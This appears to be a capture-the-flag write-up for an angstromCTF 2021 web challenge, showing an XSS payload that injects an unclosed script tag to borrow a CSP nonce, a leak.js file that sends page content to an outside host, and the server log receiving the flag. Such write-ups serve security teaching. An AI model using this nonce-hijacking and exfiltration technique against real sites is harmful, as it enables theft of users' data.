Request:
```
POST /record HTTP/1.1
Host: nomnomnom.2021.chall.actf.co
Content-Type: application/json
Content-Length: 64

{"name":"<script src=\"http://[REDACTED]/leak.js\"", "score": "10"}
```

Response
```
...
This score was set by <script src="http://[REDACTED]/leak.js"
		<script nonce='f6e97f66316c7130ef48a65121ac0bc2'>
function report() {
...
```

Interpreted by browser as
```
...
<script src="http://[REDACTED]/leak.js" <script="" nonce="f6e97f66316c7130ef48a65121ac0bc2">
function report() {
	fetch('/report/133f82792b318a47', {
		method: 'POST'
	})
}

document.getElementById('reporter').onclick = () => { report() }
		</script>
...
```

leak.js
```js
fetch('http://[REDACTED]/?flag='+document.querySelector('code').textContent);
```

Serve
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
52.207.14.64 - - [03/Apr/2021 12:27:25] "GET /leak.js HTTP/1.1" 200 -
52.207.14.64 - - [03/Apr/2021 12:27:25] "GET /?flag=actf{w0ah_the_t4g_n0mm3d_th1ng5} HTTP/1.1" 200 -
```